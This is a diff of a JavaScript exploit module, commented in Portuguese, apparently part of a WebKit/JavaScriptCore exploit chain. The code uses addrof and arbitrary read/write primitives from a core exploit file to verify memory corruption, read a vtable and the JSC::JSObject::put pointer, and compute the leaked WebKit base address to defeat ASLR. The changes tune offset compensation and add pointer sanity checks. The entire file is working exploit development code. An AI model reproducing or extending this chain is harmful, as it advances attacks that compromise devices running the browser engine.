@@ -1,9 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v102 - R62 Corrigido com Compensação de Offset)
+// js/script3/testArrayBufferVictimCrash.mjs (v103 - R63 Final com Utils Corrigido)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Corrigido um bug sutil nas primitivas de R/W que tinham um offset implícito de +0x10.
-// O código agora compensa esse offset para ler e escrever nos endereços corretos,
-// permitindo um vazamento de base do WebKit confiável.
+// Utiliza uma função 'sub' corrigida em utils.mjs e adiciona verificações de sanidade
+// nos ponteiros lidos para garantir que a cadeia de exploração não falhe devido a
+// valores de memória inesperados. Esta deve ser a versão definitiva.
 // =======================================================================================
 
 import { logS3 } from './s3_utils.mjs';
@@ -14,7 +14,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_WebKitLeak_v102_R62_FIXED";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_WebKitLeak_v103_R63_FINAL";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -90,10 +90,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         const test_obj_addr = addrof(test_obj);
         const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
-        
-        // CORREÇÃO: As primitivas R/W têm um offset implícito de +0x10.
-        // Para escrever e ler a primeira propriedade (que está em test_obj_addr + 0x10),
-        // devemos usar o endereço base do objeto como alvo.
         const rw_test_target_addr = test_obj_addr;
         
         logS3(`Escrevendo ${value_to_write.toString(true)} no endereço alvo ${rw_test_target_addr.toString(true)} (que atuará em +0x10)...`, "info");
@@ -108,37 +104,32 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             // --- FASE 5: Vazamento do Endereço Base do WebKit ---
             logS3("--- FASE 5: Vazando Endereço Base do WebKit... ---", "subtest");
             
-            // CORREÇÃO: Para ler o ponteiro da V-Table (no offset 0x0 do objeto),
-            // devemos compensar o offset implícito da primitiva de leitura subtraindo 0x10.
+            // Compensa o offset implícito de +0x10 para ler a V-Table (que está no offset 0x0 do objeto)
             const addr_to_read_vtable = test_obj_addr.sub(0x10);
             const vtable_addr = arb_read_final(addr_to_read_vtable);
             logS3(`Lido ponteiro da V-Table de ${test_obj_addr.toString(true)} -> ${vtable_addr.toString(true)}`, "info");
 
-            if (!vtable_addr || vtable_addr.equals(AdvancedInt64.Zero)) {
-                throw new Error("Ponteiro da V-Table lido é nulo ou zero, não é possível continuar.");
+            // Verificação de sanidade no ponteiro lido
+            if (!vtable_addr || vtable_addr.high() === 0) {
+                throw new Error(`Ponteiro da V-Table lido (${vtable_addr.toString(true)}) parece inválido.`);
             }
 
-            // O offset de 'put' dentro da V-Table é definido em config.mjs
-            const VIRTUAL_PUT_OFFSET_IN_VTABLE = new AdvancedInt64(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET); // Geralmente 0x18
+            const VIRTUAL_PUT_OFFSET_IN_VTABLE = new AdvancedInt64(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
             const put_func_ptr_addr = vtable_addr.add(VIRTUAL_PUT_OFFSET_IN_VTABLE);
             
-            // Lê o endereço real da função 'put' da memória
-            const put_func_addr = arb_read_final(put_func_ptr_addr.sub(0x10)); // Compensa o offset aqui também
+            // Lê o endereço da função 'put', compensando o offset da primitiva de leitura
+            const put_func_addr = arb_read_final(put_func_ptr_addr.sub(0x10));
             logS3(`Lido ponteiro da função put() da V-Table -> ${put_func_addr.toString(true)}`, "info");
             
-            if (!put_func_addr || put_func_addr.equals(AdvancedInt64.Zero)) {
-                throw new Error("Ponteiro da função put() lido é nulo ou zero.");
+            if (!put_func_addr || put_func_addr.high() === 0) {
+                throw new Error(`Ponteiro da função put() lido (${put_func_addr.toString(true)}) parece inválido.`);
             }
 
-            // Pega o offset estático da função 'put' de config.mjs
-            const PUT_FUNC_STATIC_OFFSET = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]); // 0xBD68B0
-            
-            // Calcula o endereço base: EndereçoReal - OffsetEstático = EndereçoBase
+            const PUT_FUNC_STATIC_OFFSET = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]);
             const webkit_base_addr = put_func_addr.sub(PUT_FUNC_STATIC_OFFSET);
 
             logS3(`>>>>>>>>>> ENDEREÇO BASE DO WEBKIT VAZADO: ${webkit_base_addr.toString(true)} <<<<<<<<<<`, "vuln");
             
-            // Atualiza o resultado final com sucesso e o endereço vazado
             final_result = {
                 success: true,
                 message: "Leitura/Escrita verificada e endereço base do WebKit vazado com sucesso.",
@@ -146,6 +137,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             };
 
         } else {
+            // Se a verificação falhar, restaura o valor original para não corromper o estado
+            const original_vtable = arb_read_final(test_obj_addr.sub(0x10));
+            arb_write_final(test_obj_addr, original_vtable);
             throw new Error(`A verificação de L/E falhou. Escrito: ${value_to_write.toString(true)}, Lido: ${value_read.toString(true)}`);
         }
 
@@ -156,7 +150,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
     
-    // Retorna um resultado detalhado para o orquestrador
     return {
         errorOccurred: final_result.success ? null : final_result.message,
         addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
